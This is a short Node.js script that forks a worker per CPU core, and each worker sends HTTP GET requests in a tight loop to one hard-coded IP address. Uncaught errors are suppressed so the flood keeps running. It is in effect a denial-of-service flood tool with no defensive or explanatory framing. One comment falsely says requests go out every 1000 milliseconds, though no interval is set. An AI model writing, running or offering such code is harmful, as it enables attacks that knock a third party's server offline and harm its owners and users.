const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

const options = {
  hostname: '195.72.145.135',
  port: 80,
  method: 'GET'
};

if (cluster.isMaster) {
  // Fork workers for each CPU core
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
  });
} else {
  // Each worker sends the HTTP request
  function sendRequest() {
    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        // Do something with the received data if needed
      });
    });

    req.end();
  }

  // You can adjust the interval or how many requests each worker sends
  setInterval(sendRequest); // Send a request every 1000 milliseconds

  process.on('uncaughtException', (err) => {
    // Handle uncaught exceptions here
    console.error('Uncaught Exception:', err);
  });
}



